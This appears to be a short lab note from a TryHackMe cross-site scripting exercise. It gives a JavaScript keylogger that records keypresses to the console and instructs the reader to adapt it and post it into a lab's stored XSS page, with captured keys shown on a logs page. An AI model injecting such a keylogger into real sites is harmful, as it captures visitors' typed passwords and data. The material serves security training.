# Key-Logger with XSS

- **Javascript** can be used for many things, including creating an event to listen for keypresses.
- Sample Key-Logger

  ```
  <script type="text/javascript">
    let l = ""; 
    document.onkeypress = function (e) 
    { 
      l += e.key; 
      console.log(l); 
    }
  </script>
  ```
- [View above script with explanation](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/09%20-%20Key-Logger%20with%20XSS/1.%20Key-Logger.js)

- Now you have this script, can you adapt it and post it into the ***[stored xss](http://IP_ADDRESS_OF_TRYHACKME_LAB/stored)*** page. Then start typing on that page and see it appear on the ***[logs](http://IP_ADDRESS_OF_TRYHACKME_LAB/logs)*** page.

